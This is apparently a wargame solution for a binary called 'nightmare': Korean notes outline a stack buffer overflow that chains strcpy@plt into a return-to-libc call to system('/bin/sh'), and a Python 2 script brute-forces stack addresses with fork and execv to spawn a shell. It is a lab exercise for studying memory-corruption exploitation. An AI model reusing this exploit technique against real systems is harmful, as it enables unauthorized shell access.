'''
objdump -h nightmare | grep plt
이 명령어로 plt 주소를 알 수 있음.

1. memset이 실행되고 난 후 실행되는 strcpy함수를 이용해서 strcpy함수의 ret값을 덮어줌.

2. strcpy가 끝나고 실행되는 ret영역(AAAA)를 argv[2]의 포인터로 덮어씌우고 argv[2] 영역에 system함수로 공격

* argv[2]의 주소를 알아내기 위해 b *main+3 에 브레이크 포인트를 걸어준다.
  main 함수의 ret값 다음 4바이트 부분(buf[48]~[51])영역 주소를 위해 b *main+118에 BP한다.
->> argv[2]와 strcpy의 ret값을 알 수 있음.

3. &system = 0x40058ae0
   &/bin/sh = 0x400fbff9
   
==>
 -argv[1]
  buffer[40] + SFP[4] + ret(strcpy@plt) + dummy[4] + &buffer[48] + argv[2]

 -argv[2]
  &system + dummy[4] + &/bin/sh

'''


import sys,os,struct

target=os.getcwd()+"/"+sys.argv[1]

strcpy=0x8048410
dummydes=0xbffffad0
system=0x40058ae0
bin=0x400fbff9

for h in range(0xff,0xf0,-1):
        for l in range(0x00,0x100,4):
                payload="a"*44+struct.pack('<I',strcpy)+"abcd"
                payload=payload+struct.pack('<I',dummydes)+chr(h)+chr(l)+"\xff\xbf"
                shell=struct.pack('<I',system)+"abcd"+struct.pack('<I',bin)
                pid=os.fork()
                if pid==0:
                        os.execv(target,('lhj',payload,shell))
                else:
                        os.waitpid(pid,0)

